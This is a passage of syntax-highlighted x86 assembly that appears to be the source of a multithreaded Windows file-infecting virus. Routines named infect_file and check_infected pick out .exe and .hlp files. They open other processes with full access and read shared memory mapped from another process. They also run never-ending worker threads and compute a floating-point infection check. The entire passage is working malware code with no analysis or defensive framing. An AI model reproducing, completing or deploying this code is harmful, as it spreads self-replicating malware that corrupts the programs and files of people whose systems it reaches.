    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">active</span><span class="sc4">+</span><span class="sc5">st_count</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@end</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">st_count</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">end_thread</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">thread</span><span class="sc0">
    </span><span class="sc5">st_count</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">st_count</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">@@end</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;sleep function</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">                    </span><span class="sc1">;don't terminate</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">thread</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">check_infected</span><span class="sc4">-</span><span class="sc5">infect_file</span><span class="sc0">
</span><span class="sc5">infect_file</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc5">start_thread</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">vbody</span><span class="sc4">+</span><span class="sc5">vsize</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">ifex</span><span class="sc4">:</span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ifex</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20202020h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">44</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">active</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">process</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;infect_exe hProcess, ProcID</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'exe.'</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">if_2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'plh.'</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">if_failed</span><span class="sc0">
   </span><span class="sc5">if_call_hlp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">               </span><span class="sc1">;infect_hlp</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc5">if_2</span><span class="sc4">:</span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;active infect_exe (_hlp)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">1F0FFFh</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;OpenProcess</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">if_failed</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc5">if_r</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">13</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;WaitForSingleObject</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">if_r</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">if_failed</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">end_thread</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc0">
</span><span class="sc5">infect_file</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">create_infected</span><span class="sc4">-</span><span class="sc5">check_infected</span><span class="sc0">
</span><span class="sc5">check_infected</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc5">start_thread</span><span class="sc0"> </span><span class="sc5">check_infected</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">5</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ci_nomem</span><span class="sc0">

   </span><span class="sc5">other_process_mem</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">shared_mem</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">param</span><span class="sc0">    </span><span class="sc1">;get mem from other process</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"1"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">shared_mem</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;OpenFileMappingA</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">shared_mem</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;MapViewOfFile</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc9">endm</span><span class="sc0">

    </span><span class="sc5">other_process_mem</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc5">ci_nomem</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc10">tbyte</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;number of the terms in a</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;equation</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ci_failed</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">jnbe</span><span class="sc0">    </span><span class="sc5">ci_failed</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">128</span><span class="sc0">
    </span><span class="sc7">fsave</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,-(</span><span class="sc10">tbyte</span><span class="sc4">+</span><span class="sc10">tbyte</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">tbyte</span><span class="sc4">+</span><span class="sc10">tbyte</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc10">tbyte</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;data starts here</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">vbody</span><span class="sc4">+</span><span class="sc5">vsize</span><span class="sc4">+</span><span class="sc2">260</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">5</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">vbody</span><span class="sc4">+</span><span class="sc5">vsize</span><span class="sc4">+</span><span class="sc2">260</span><span class="sc4">+</span><span class="sc5">ci_size</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc10">tbyte</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;derivation of the equations</span><span class="sc0">
    </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">;you'll get two tangents</span><span class="sc0">
    </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc7">fmul</span><span class="sc0">
    </span><span class="sc7">fld1</span><span class="sc0">
    </span><span class="sc7">fsubp</span><span class="sc0">   </span><span class="sc8">st</span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">),</span><span class="sc8">st</span><span class="sc0">
    </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc10">tbyte</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,-(</span><span class="sc10">tbyte</span><span class="sc4">+</span><span class="sc10">tbyte</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc10">tbyte</span><span class="sc4">+</span><span class="sc10">tbyte</span><span class="sc0">
    </span><span class="sc7">fldz</span><span class="sc0">
    </span><span class="sc7">fldz</span><span class="sc0">
    </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc10">tbyte</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc10">tbyte</span><span class="sc4">+</span><span class="sc10">tbyte</span><span class="sc0">       </span><span class="sc1">;involution of the equations</span><span class="sc0">
    </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc10">tbyte</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc10">tbyte</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc7">fxch</span><span class="sc0">    </span><span class="sc8">st</span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">)-</span><span class="sc5">check_infected</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc7">fyl2x</span><span class="sc0">                   </span><span class="sc1">;over natural logarithm</span><span class="sc0">
    </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc7">frndint</span><span class="sc0">
    </span><span class="sc7">fsubr</span><span class="sc0">   </span><span class="sc8">st</span><span class="sc4">(</span><span class="sc2">1</span><span class="sc4">),</span><span class="sc8">st</span><span class="sc0">
    </span><span class="sc7">fxch</span><span class="sc0">
    </span><span class="sc7">fchs</span><span class="sc0">
    </span><span class="sc7">f2xm1</span><span class="sc0">
    </span><span class="sc7">fld1</span><span class="sc0">
    </span><span class="sc7">faddp</span><span class="sc0">
    </span><span class="sc7">fscale</span><span class="sc0">
    </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc8">st</span><span class="sc4">(</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc7">fmul</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc10">tbyte</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc10">dword</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc7">faddp</span><span class="sc0">
    </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc10">tbyte</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc10">dword</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">35</span><span class="sc0">                </span><span class="sc1">;we've two points on the curve</span><span class="sc0">
    </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc10">dword</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc7">faddp</span><span class="sc0">
    </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc10">dword</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,-(</span><span class="sc10">tbyte</span><span class="sc4">+</span><span class="sc10">tbyte</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;next term in the equation</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">85</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc10">tbyte</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;calculate an angle of the</span><span class="sc0">
    </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;two tangents of the equation</span><span class="sc0">
    </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">(</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">(</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc7">fsub</span><span class="sc0">
    </span><span class="sc7">fxch</span><span class="sc0">    </span><span class="sc8">st</span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc7">fmul</span><span class="sc0">
    </span><span class="sc7">fld1</span><span class="sc0">
    </span><span class="sc7">fadd</span><span class="sc0">
    </span><span class="sc7">fdiv</span><span class="sc0">
    </span><span class="sc7">fabs</span><span class="sc0">
    </span><span class="sc7">fld1</span><span class="sc0">
    </span><span class="sc7">fpatan</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">180</span><span class="sc0">             </span><span class="sc1">;radian -&gt; angle</span><span class="sc0">
    </span><span class="sc7">fimul</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc7">fldpi</span><span class="sc0">
    </span><span class="sc7">fdiv</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,-(</span><span class="sc10">tbyte</span><span class="sc4">+</span><span class="sc10">tbyte</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc10">tbyte</span><span class="sc4">+</span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">5</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-(</span><span class="sc10">dword</span><span class="sc4">-</span><span class="sc5">ci_size</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc7">fsub</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc10">tbyte</span><span class="sc0">
    </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
